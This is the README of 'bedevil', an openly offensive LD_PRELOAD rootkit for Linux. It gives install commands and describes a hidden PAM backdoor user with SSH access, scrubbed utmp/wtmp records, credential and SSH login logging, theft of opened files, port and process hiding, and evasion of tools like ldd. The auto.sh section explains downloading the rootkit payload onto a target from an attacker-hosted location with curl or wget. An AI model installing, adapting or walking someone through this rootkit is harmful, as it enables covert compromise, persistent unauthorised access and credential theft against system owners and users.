# bedevil

<img src=https://i.imgur.com/PyO00vy.png alt="icon" />

</br>

 * Based on my other rootkit, [vlany](https://github.com/mempodippy/vlany)
 * bedevil is designed to be more robust, faster and efficient than vlany.

## Overview
 * This is an LD_PRELOAD rootkit. Therefore, this rootkit runs in userland.
 * During the creation of this rootkit I had some goals in mind.
   * Tidy up previously existing aspects of precursor (LD_PRELOAD) rootkits.
   * Fix outstanding issues. (from vlany)
   * Create a more manageable & _robust_ system of rootkit functionalities.
   * Working on anything in vlany just felt like a huge mess, I grew to hate this. I knew it could be better...
 * The only dependency inherently required is bash, for running all of the setup scripts.
   * This won't be the case for much longer...
 * When it comes to actual rootkit dependencies, there are only a few.
   * Most will already be installed.
   * Those that aren't can be installed with the available script.


<hr>

## bedevil.sh
### Usage

<img src=https://i.imgur.com/s9VloGH.png alt="bedevil.sh script output"/>

 * __The order in which you pass flags to this script are essential.__

#### Usage examples
 * *Compile only:* `./bedevil.sh -dc` (compile the rootkit in your cwd)  
 * *Changing values (example):* `BD_UNAME=my_uname BD_PWD=my_pwd ./bedevil.sh -dc`  
 * *Full installation:* `./bedevil.sh -ti` (will ask what you want to enable/disable then launch installation)
 * *Mimic installation:* `LDSO_PRELOAD=/tmp/fakepreload ./bedevil.sh -i` (mimic rootkit installation/setup without preloading the rootkit)
 * **Compressing include directory & using resulting tarball**:
     * Compressing: `BD_UNAME=myuname BD_PWD=mypassword ... ./bedevil.sh -vzd`
     * Using tarball: `TARBALL=./pathto.tar.gz ./bedevil.sh ...`
     * i.e.: `TARBALL=./pathto.tar.gz ./bedevil.sh -i/-c`

<hr>

## Example installation
 * In this example, the command I issued was
   * `BD_UNAME=sexlovegod ./bedevil.sh -i`

<img src=https://i.imgur.com/e5Oc8kt.png alt="Example installation result"/>

* If `etc/id_rsa.pub` exists before installation, it will be copied to your installation directory as an authorized key for ssh login.

### Logging in to new backdoor user
 * Upon successful installation you can log in to the box using your backdoor credentials.

<img src=https://i.imgur.com/MlsC2mN.png alt="Example connection to PAM backdoor." />

 * _emule_ is just a box I've got running on my local network.
 * If the box you're trying to log into has their ssh service open on a different port (not 22) you can specify a different port to use by changing the value of `SSH_PORT`, either at runtime or edit it in the script.
 * Example: `bash SSH_PORT=23 etc/ssh.sh ...`

<hr>

## auto.sh
 * Instant installation script for use with preconfigured setups.
 * Uses the base64'd tar.gz archive created after compression.
   * You need to change where this script will try to get this file from.
     * See `B64TARGZ_LOCATION`.
   * `wget`/`curl` is required for downloading the file.
     * You could instruct the script to use a file available locally, instead of trying to download one.
 * This script relies on the contents & format of the 'settings' & 'toggles.conf' files.
   * Both of these files are written by `bedevil.sh` during compression.
   * This method of storing settings could be better than what it is right now.
   * But considering the purpose, this is ok.
 * At the stage this script is currently in, utilising the dynamic linker patch isn't as straight forward as it should/I'd like it to be.

### Example
 * `BD_UNAME=sexand BD_PWD=lovegod ./bedevil.sh -vzd`
 * Host resulting `*.so.inc.b64` somewhere you can access from the target.
 * The box must be able to use `curl`/`wget` to download it.
 * Change `B64TARGZ_LOCATION` accordingly.

<img src=https://i.imgur.com/QPCxDRP.png/>
<img src=https://i.imgur.com/jzmvsiM.png/>

 * Something worth noting is that `patch_sshdconfig` doesn't exist here.
 * Whereas it normally would, and be executed, with `bedevil.sh`.
 * Small price to pay.
 * If this proves to be problematic, you can do it yourself.
 * See `etc/postinstall.sh` for this function.

<hr>

## Features
 * [`inc/toggles.h`](https://github.com/kcaaj/bdvl/blob/master/inc/toggles.h)
   * Exactly what it sounds like.
   * Provides a means of controlling what bedevil can & will do upon installation.
   * Ample details within comments. 
 * See the table below.

| Toggle           | Info                                                         | Default status | Dependency | Ignored(?) |
| :-------------   | :----------------------------------------------------------- | :------------- | :--------- | :--------- |
| `USE_PAM_BD`     | allows interactive login as a backdoor user via ssh          | on            | libpam     | no         |
| `LOG_LOCAL_AUTH` | log successful user authentications on the box                   | off            | libpam     | no         |
| `HIDE_SELF`      | hides files and processes based on rootkit magic GID         | on             | -          | yes        |
| `FORGE_MAPS`     | hides rootkit presence from process map files                | on             | -          | yes        |
| `HIDE_PORTS`     | hides ports & port ranges defined in 'hide_ports' file       | on             | -          | yes        |
| `DO_REINSTALL`   | maintains the rootkit's preload file                         | on             | -          | yes        |
| `DO_EVASIONS`    | hides rootkit presence from unsavoury processes              | on             | -          | yes        |
| `HIDING_UTIL`    | allows (un)hiding of paths & of self        | on             | -          | yes        |
| `LOG_SSH`        | logs login attempts from over ssh                      | off            | -          | yes         |
| `FILE_STEAL`     | attempts to steal FoI when opened by open/fopen              | off            | -          | no         |
| `LINK_IF_ERR`    | link said FoI if we can't copy it                            | off            | -          | yes        |
| `USE_CRYPT`      | to use or not to use libcrypt                                | on             | libcrypt   | yes        |

<hr>

#### PAM backdoor
 * By hijacking libpam & libc's authentication functions, we are able to create a phantom backdoor user.
 * During installation you're given a username & password.
   * By default the username & password are randomly generated.
   * You can specify a username and/or password of your own by setting them before running `bedevil.sh`.
     * i.e.: `BD_UNAME=myusername BD_PWD=mypassword ./bedevil.sh ...`
 * [`etc/ssh.sh`](https://github.com/kcaaj/bdvl/blob/master/etc/ssh.sh) makes logging into your PAM backdoor with your hidden port that bit easier.
 * The responsible [utmp & wtmp functions](https://github.com/kcaaj/bdvl/tree/master/inc/utmp) have been hooked & information that may have indicated a backdoor user on the box is no longer easily visible.

#### Credential logging
 * `LOG_LOCAL_AUTH`
   * bedevil will intercept `pam_vprompt` and log successful authentications on the box.
   * Log results are available in your installation directory.
 * `LOG_SSH`
   * bedevil intercepts `read` and `write` in order to log login attempts over ssh.
   * Again, logs are available in your installation directory.

<hr>

#### Evasion & hiding

##### Port hiding
 * With bedevil installed, you can hide or unhide any ports/ranges on the box by editing the `hide_ports` file in the rootkit's installation directory.
 * Additionally, before any configuration/setup, you can define what ports/ranges will be hidden by writing them to `inc/hide_ports`.
```
$ cat hide_ports
9146
304-306
1000-1003
```
*Where a hyphen is the range delimiter...*

##### Rootkit presence
 * bedevil will hide itself from the process memory map files upon being read.
 * Reading `/proc/*/*maps`, when bedevil is installed won't reveal the kit's location.
 * __HOWEVER__, dependencies required by the rootkit will be visible. (namely, libcrypt & libssl)

##### Scary things
 * bedevil will hide from defined scary processes, paths & environment variables.
 * See [`inc/hiding/evasion/evasion.h`](https://github.com/kcaaj/bdvl/blob/master/inc/hiding/evasion/evasion.h) for the things that bedevil will evade.
 * i.e.: Running `ldd`.
   * Calling `ldd` as a regular user will show an error.
   * This user's privileges do not suffice.
   * The calling process __must__ have the power to uninstall & reinstall our rootkit.
   * Running `ldd` again with sufficient privilege will show a totally clean output.
   * This is because, during the runtime of (_in this case_) `ldd` the rootkit is not installed.
   * Upon the application exiting/returning, the parent (rootkit) process of whatever just finished running reinstalls the rootkit.


<!--

RANDOM NOTES:
  having DO_EVASIONS enabled allows a 'bug' where a root user can
  uninstall the rootkit by running ldd through an infinite
  loop. i.e.: `while true; do ldd /bin/echo; done`

LINKS OF INTEREST:
 - https://pastebin.com/rZvjDzFK

asddsadsad

-->
